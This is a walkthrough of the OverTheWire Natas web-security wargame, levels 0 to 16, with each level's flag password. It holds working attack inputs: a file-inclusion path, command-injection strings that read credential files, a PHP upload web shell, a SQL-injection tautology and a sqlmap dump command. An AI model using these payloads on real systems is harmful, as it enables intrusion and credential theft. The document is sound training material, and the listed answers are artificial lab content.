# Natas

### Level numbers are the current level, passwords are for the next level

## Level 0

View page source.

g9D9cREhslqBKtcA2uocGHPfMZVzeFK6

## Level 1

Disable javascript or use devtools.

h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

## Level 2

View source, note presence of /files directory. Users.txt contains passwords.

G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

## Level 3

Source comment indicates presence of robots.txt, revealing /s3cr3t/ path. Users.txt contains passwords.

tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

## Level 4

Alter referer request header to http://natas5.natas.labs.overthewire.org/

Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

## Level 5

Alter `loggedin` cookie value to 1.

fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

## Level 6

View PHP source code, secret is in included file `/includes/secret.inc`

FOEIUWGHFEEUHOFUOIU

jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

## Level 7

An LFI exploit is possible via the `page` query string parameter:

`http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8`

a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

## Level 8

View PHP source, note encoding function. Simply reverse the encoding process to get the secret which reveals the flag.

```php
echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
```
oubWYf2kBq

Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

## Level 9

View PHP source code. Obvious injection vulnerability is present via `passthru` call with input: 

`; echo /etc/natas_webpass/natas10`

D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

## Level 10

Same vulnerability as Level 9, but requires us to do it without semicolon to escape:

`. cat /etc/natas_webpass/natas11`

1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

## Level 11

Cookies are json encoded objects:

```php
array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"); 
```

They are then XOR'd with an unknown key, and lastely base64 encoded.

With some reversing of the XOR code we can divine the key used:

```php
$cookie = "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=";  
  
function xor_encrypt($in) {  
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}  
  
echo xor_encrypt(base64_decode($cookie));  

// KNHL
```

Now we just encode our own cookie using the key and set it into the browser context.

YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

## Level 12

Challenge can be exploited by uploading a malicious php file and changing the extension the form is expecting.

```php
<?php echo system("cat /etc/natas_webpass/natas13"); ?>
```

We can then visit the script and get the key:

`http://natas12.natas.labs.overthewire.org/upload/92196mmfbo.php`

lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

## Level 13

Same as level 13, except we can only upload files that pass a `exif_imagetype` check.

We can craft a malicious payload by saving a php script with the .jpg extension and using a hex editor to insert the magic jpeg bites at the beginning of the file: `FF D8 FF DB`

qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

## Level 14

SQL injection is evident when examining the PHP source code. Submitting the password parameter like so will reveal the password:

`password: " or "1" = "1`

TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

## Level 15

SQL injection is used to elicit the `natas16` user's password via a brute force comparison approach. 

~~See natas15.py~~

Ended up using sqlmap instead, for some reason the python brute force method could not get past `aOlfEjHqj32V` despite confirming that I'm testing all possible characters.

```sh
sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --string="This user exists" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --data "username=natas16" --level=5 --risk=3 -D natas15 -T users -C username,password --dump
```

TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

## Level 16

This is blind injection(not SQL, however), exploitable in a similar fashion as level 10. We cannot use even more characters this time.

Example input:
`wrong$(grep a /etc/natas_webpass/natas17)`

See natas16.py

